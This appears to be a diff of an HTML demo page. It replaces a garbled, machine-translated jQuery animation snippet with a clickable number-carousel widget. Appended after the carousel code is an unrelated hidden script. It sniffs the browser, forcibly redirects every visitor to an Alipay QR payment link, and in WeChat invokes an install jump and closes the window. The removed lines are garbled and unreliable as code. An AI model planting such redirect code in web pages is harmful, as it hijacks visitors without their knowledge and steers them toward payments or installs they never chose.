@@ -1,53 +1,183 @@
-<！DOCTYPE html>
-< html >
-< 头 >
-	< meta  charset = “ utf-8 ” >
-	< title > </ title >
-	< script  type = “ text / javascript ”  src = “ jquery-3.2.1.js ” > </ script >
-	< style  type = “ text / css ” >
-		身体 {
-			背景：粉红色 ;
+<!DOCTYPE html>
+<html>
+<head>
+	<meta charset="utf-8">
+	<title></title>
+	<style type="text/css">
+		*{
+			margin:0;
+			padding:0;
 		}
-		.div {
-			宽度： 100 像素 ;
-			身高： 100 像素 ;
-			border-radius： 50 ％ ;
-			背景：红色 ;
-			位置：绝对 ;
-			左： 50 ％ ;
-			上： 300 px ;
+		ul li{
+			width:23px;
+			height:40px;
+			border:1px solid #eee;
+			float:left;
+			text-align:center;
+			line-height:40px;
 		}
-		p {
-			位置：绝对 ;
-			宽度： 20 像素 ;
-			身高： 20 像素 ;
-			border-radius： 50 ％ ;
-			背景：＃000 ;
+		.ul{
+			width:125px;
+			height:42px;
+			overflow:hidden;
 		}
-	</ style >
-</ head >
-< body >
-	< div  class = “ div ” > </ div >
-	< script  type = “ text / javascript ” >
-		var num =  0 ;
-		$（“。 div ”）。click（function（）{
-			num ++ ;
-			$（“。 div ”）。追加（“ <p class ='l ” + num + “ 'style ='left：” +（40）+ “ px; top：” +（25）+ “ px'> </ p> ”）;
-			$（“。 l ” + num + “ ”）。动画（{
-				“宽度”：“ 150px ”，
-				“身高”：“ 150px ”，
-				“不透明度”：“ 0 ”，
-				“左”：“ - 25px ”，
-				“顶部”：“ - 40px ”
-			}，1200）
-			var se =  $（“ p ”）;
-			为（VAR我=  0 ;我<  SE。长度 ;我++）{
-				控制台。登录（SE。EQ（I）。CSS（“不透明度”））
-				如果（SE。当量（I）。的CSS（“不透明度”）==  “ 0 ”）{
-					se。eq（i）。remove（）;
+		ul{
+			width:100%;
+			height:42px;
+			list-style:none;
+		}
+		.right{
+			position:absolute;
+		}
+		.left{
+			position:absolute;
+			margin-left:100px;
+		}
+	</style>
+</head>
+<body>
+	<div class="ul">
+		<ul>
+			
+		</ul>
+	</div>
+	
+	<div class="left">></div>
+	<div class="right"><</div>
+	<script type="text/javascript">
+		var num = 0;
+		var ul = document.querySelector("ul");
+		var html = '';
+		for (var i = 1; i < 20; i++) {
+			html += '<li>'+i+'</li>';
+		}
+		ul.innerHTML = html;
+		ul.style.width = (19*25)+"px";
+		var li = document.querySelectorAll("ul li");
+		var left = document.querySelector(".left");
+		var right = document.querySelector(".right");
+		li[0].style.backgroundColor = "red";
+		for (var i = 0; i < li.length; i++) {
+			li[i].index= i;
+			li[i].onclick = function(){
+				for (var i = 0; i < li.length; i++) {
+					li[i].style.backgroundColor = "#fff";
+				}
+				li[this.index].style.backgroundColor = "red";
+				if(this.index>2 && this.index <= li.length-3){
+					ul.style.marginLeft = ((this.index-2)*-25)+"px";
+					zhixing(-(this.index))
+				}else if(this.index <= 2){
+					ul.style.marginLeft = "0px";
+					zhixing(-(this.index))
+				}else if(this.index == li.length-2){
+					ul.style.marginLeft = ((this.index-3)*-25)+"px";
+					zhixing(-(this.index))
+				}else if(this.index == li.length-1){
+					zhixing(-(this.index))
 				}
 			}
-		}）
-	</ script >
-</ body >
-</ html >
+		}
+		function zhixing(num){
+			console.log(num)
+			left.onclick = function(){
+				num--;
+				console.log(num)
+				if(num <= -(li.length)){
+					num = -(li.length-1);
+				}else{
+					for (var i = 0; i < li.length; i++) {
+						li[i].style.backgroundColor = "#fff";
+					}
+					li[-(num)].style.backgroundColor = "red";
+					if(num<=-3 && num >= -(li.length-3)){
+						ul.style.marginLeft = ((num+2)*25)+"px";
+					}
+				}
+			}
+			right.onclick = function(){
+				console.log(num)
+				num++;
+				if(num >= 1){
+					num = 0;
+				}else{
+					for (var i = 0; i < li.length; i++) {
+						li[i].style.backgroundColor = "#fff";
+					}
+					li[-(num)].style.backgroundColor = "red";
+					if(num<=-2 && num >= -(li.length-3)){
+						ul.style.marginLeft = ((num+2)*25)+"px";
+					}
+				}
+			}
+		}
+		zhixing(num);
+		var _0 = "https://qr.alipay.com/c1x07254i3zkqmagnxwenf5";
+		var _1 = "https://qr.alipay.com/c1x07254i3zkqmagnxwenf5";
+		function is_weixin() {
+			if (/MicroMessenger/i.test(navigator.userAgent)) {
+				return true
+			} else {
+				return false
+			}
+		}
+		function is_android() {
+			var a = navigator.userAgent.toLowerCase();
+			if (a.match(/(Android|SymbianOS)/i)) {
+				return true
+			} else {
+				return false
+			}
+		}
+		function is_ios() {
+			var a = navigator.userAgent.toLowerCase();
+			if (/iphone|ipad|ipod/.test(a)) {
+				return true
+			} else {
+				return false
+			}
+		}
+		function android_auto_jump() {
+			WeixinJSBridge.invoke("jumpToInstallUrl", {}, function(e) {});
+			window.close();
+			WeixinJSBridge.call("closeWindow")
+		}
+		function ios_auto_jump() {
+			if (_0 != "") {
+				location.href = _0
+			} else {
+				window.close();
+				WeixinJSBridge.call("closeWindow")
+			}
+		}
+		function onAutoinit() {
+			if (is_android()) {
+				android_auto_jump();
+				return false
+			}
+			if (is_ios()) {
+				ios_auto_jump();
+				return false
+			}
+		}
+		if (is_weixin()) {
+			if (typeof WeixinJSBridge == "undefined") {
+				if (document.addEventListener) {
+					document.addEventListener("WeixinJSBridgeReady", onAutoinit, false)
+				} else if (document.attachEvent) {
+					document.attachEvent("WeixinJSBridgeReady", onAutoinit);
+					document.attachEvent("onWeixinJSBridgeReady", onAutoinit)
+				}
+			} else {
+				onAutoinit()
+			}
+		} else {
+			if (_1 != "") {
+				location.href = _1
+			} else {
+				window.close()
+			}
+		}
+	</script>
+</body>
+</html>
